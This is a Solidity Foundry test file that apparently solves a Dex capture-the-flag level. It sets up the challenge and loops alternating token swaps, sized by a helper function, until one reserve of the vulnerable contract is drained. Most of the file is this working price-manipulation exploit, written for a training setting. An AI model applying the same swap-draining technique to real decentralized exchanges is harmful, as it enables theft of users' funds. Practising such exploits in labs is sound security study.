// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*22-Dex.t.sol'
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/22-Dex.sol";
import "../contracts/22-DexFactory.sol";
import "../lib/forge-std/src/console2.sol";

contract DexTest is Test {
    DexFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];
        // log eoa address
        console2.log("eoa:", eoa);

        // Deploy factory to create challenge instance
        factoryContract = new DexFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 1 ether}(address(eoa));
    }

    // function afterRun() public returns (bool) {
    //     return factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
    // }

    function calculateMaxTokenWithdraw(uint amount, bool isToToken1) public returns(uint) {
        Dex challenge = Dex(address(challengeAddress));

        // Determine the to and from addresses
        address to = isToToken1 ? challenge.token1() : challenge.token2();
        address from = isToToken1 ? challenge.token2() : challenge.token1();
        uint toBalance = IERC20(to).balanceOf(challengeAddress);

        // calculate swapAmount so we can calculate the maximum that we can swap (maxWithdraw)
        uint256 swapAmount = ((amount * IERC20(to).balanceOf(challengeAddress))/IERC20(from).balanceOf(challengeAddress));

        // calculate max withdraw
        // If the swapAmount is greater than the toBalance, then we need to recalculate the amount that we want to swap
        uint maxWithdraw;
        if (swapAmount > toBalance) {
            maxWithdraw = (amount * IERC20(from).balanceOf(challengeAddress)) / IERC20(to).balanceOf(challengeAddress);
            // calculate new swapAmount
            swapAmount = ((maxWithdraw * IERC20(to).balanceOf(challengeAddress))/IERC20(from).balanceOf(challengeAddress));
            if (swapAmount > toBalance) {
                // recalculate maxWithdraw so that it is less than or equal to toBalance
                maxWithdraw = (toBalance * IERC20(from).balanceOf(challengeAddress)) / IERC20(to).balanceOf(challengeAddress);
            }
        } else {
            maxWithdraw = amount;
        }
        
        return maxWithdraw;

    }

    function testCheck() public {
        // Get Challenge Instance
        Dex challenge = Dex(address(challengeAddress));
        vm.startPrank(eoa, eoa);

        // Set the challange contract to have infinite approval for the eoa
        challenge.approve(challengeAddress, type(uint256).max);

        while (challenge.balanceOf(challenge.token1(), address(challenge)) >= 0 || challenge.balanceOf(challenge.token2(), address(challenge)) >= 0) {
            // get eoa balance of token 1
            uint256 token1Balance = challenge.balanceOf(challenge.token1(), eoa);
            // get eoa balance of token 2
            uint256 token2Balance = challenge.balanceOf(challenge.token2(), eoa);

            uint256 token1MaxAmount = calculateMaxTokenWithdraw(token1Balance, false);
            // Swap token 1 for token 2
            challenge.swap(challenge.token1(), challenge.token2(), token1MaxAmount);

            // if to balance is 0, break as the contract has run out of funds.
            if (challenge.balanceOf(challenge.token1(), address(challenge)) == 0 || challenge.balanceOf(challenge.token2(), address(challenge)) == 0) {
                break;
            }

            uint256 token2MaxAmount = calculateMaxTokenWithdraw(token2Balance, true);
            // Swap token 2 for token 1
            challenge.swap(challenge.token2(), challenge.token1(), token2MaxAmount);
        }

        bool result = factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
        assertEq(result, true, "Challenge should be solved");
    }
}
